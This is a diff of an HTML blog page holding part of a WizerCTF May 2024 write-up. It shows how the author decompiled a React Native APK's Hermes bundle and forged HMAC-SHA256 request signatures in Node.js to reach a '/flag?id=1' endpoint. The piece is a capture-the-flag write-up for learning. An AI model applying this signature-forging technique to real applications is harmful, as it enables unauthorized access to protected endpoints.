@@ -508,26 +441,16 @@ Returns a string representing the source code of the function. Overrides the Obj
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/download/SignHere.apk&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Download the app &lt;a href=https://sam-staging.wizer-ctf.com/downloads/SignHere.apk&gt;here&lt;/a&gt;&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">});</span></span></span></code></pre></div></div>
-<p>Downloading the APK and starting it with jadx we found some strings related to facebook react and can find the <code>assets/index.android.bundle</code> file confirming it is react native application , the file is not readable as it is in bytecode format , decompressing the apk and running <code>file</code> against it we found the following</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>index.android.bundle: Hermes JavaScript bytecode, version 96</code></pre></div>
-<p>searching for de-compilers for this version only found this one <a href="https://github.com/P1sec/hermes-dec" target="_blank" rel="noopener noreffer ">herhermes-dec</a> which can decompile and dis-assemble the bundle file</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># install </span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>Downloading the APK and starting it with jadx we found some strings related to facebook react and can find the <code>assets/index.android.bundle</code> file confirming it is react native application , the file is not readable as it is in bytecode format , decompressing the apk and running <code>file</code> against it we found the following</p>
+<pre tabindex="0"><code>index.android.bundle: Hermes JavaScript bytecode, version 96
+</code></pre><p>searching for de-compilers for this version only found this one <a href="https://github.com/P1sec/hermes-dec" target="_blank" rel="noopener noreffer ">herhermes-dec</a> which can decompile and dis-assemble the bundle file</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># install </span>
 </span></span><span class="line"><span class="cl">sudo pip3 install --upgrade git+https://github.com/P1sec/hermes-dec
 </span></span><span class="line"><span class="cl"><span class="c1"># run commands</span>
 </span></span><span class="line"><span class="cl">hbc-disassembler assets/index.android.bundle file.hasm
-</span></span><span class="line"><span class="cl">hbc-decompiler assets/index.android.bundle file.js    </span></span></code></pre></div></div>
-<p>Running the apk to see where to search for what , also we will run proxydroid with burpsuite ip as a proxy to interecpt traffic and capture requests</p>
+</span></span><span class="line"><span class="cl">hbc-decompiler assets/index.android.bundle file.js    
+</span></span></code></pre></div><p>Running the apk to see where to search for what , also we will run proxydroid with burpsuite ip as a proxy to interecpt traffic and capture requests</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -559,12 +482,7 @@ Returns a string representing the source code of the function. Overrides the Obj
         alt="/assets/images/CTFs/wizerCTF2024/6_3.png"
         title="image" /></p>
 <p>now using following page we can re-produce same signature in the login request</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-js">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">generateSignature</span><span class="p">(</span><span class="nx">secret</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nx">secret</span><span class="p">);</span>
@@ -579,14 +497,8 @@ Returns a string representing the source code of the function. Overrides the Obj
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">signature</span> <span class="o">=</span> <span class="nx">generateSignature</span><span class="p">(</span><span class="nx">secret</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">body</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">signature</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="c1">// output : 9c04251d39d1578eb2b04526b7a1c87367598779ae68a627b5ec64fbf1272356
-</span></span></span></code></pre></div></div>
-<p>to generate a signature for the flag we can use same page but modify the url and add a parameter <code>id</code> as exepceted in the code above , get signature from below script , get new cookie after a fresh login add both and get the flag</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-js">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+</span></span></span></code></pre></div><p>to generate a signature for the flag we can use same page but modify the url and add a parameter <code>id</code> as exepceted in the code above , get signature from below script , get new cookie after a fresh login add both and get the flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">generateSignature</span><span class="p">(</span><span class="nx">secret</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nx">secret</span><span class="p">);</span>
@@ -599,8 +511,8 @@ Returns a string representing the source code of the function. Overrides the Obj
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="s1">&#39;/flag?id=1&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;password&#39;</span> <span class="p">};</span>
 </span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">signature</span> <span class="o">=</span> <span class="nx">generateSignature</span><span class="p">(</span><span class="nx">secret</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="nx">body</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">signature</span><span class="p">);</span></span></span></code></pre></div></div>
-<p><img
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">signature</span><span class="p">);</span>
+</span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="/assets/images/CTFs/wizerCTF2024/6_4.png"
@@ -616,7 +528,7 @@ Returns a string representing the source code of the function. Overrides the Obj
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" data-title="WizerCTF-May2024" data-via="tinkerhell1337" data-hashtags="CTF,SQLi,XSS,React,nodejs"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fhussienmisbah.github.io%2fposts%2fcode-review%2f2024-05-06-wizerctf-may-2024%2f&amp;text=WizerCTF-May2024" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" data-title="WizerCTF-May2024" data-via="tinkerhell1337" data-hashtags="CTF,SQLi,XSS,React,nodejs"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" data-title="WizerCTF-May2024"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" data-title="WizerCTF-May2024"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hussienmisbah.github.io/posts/code-review/2024-05-06-wizerctf-may-2024/" data-title="WizerCTF-May2024"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
@@ -633,17 +545,14 @@ Returns a string representing the source code of the function. Overrides the Obj
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://hussienmisbah.github.io/" target="_blank">0xMesbaha</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a>
-        </div>
-
-        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
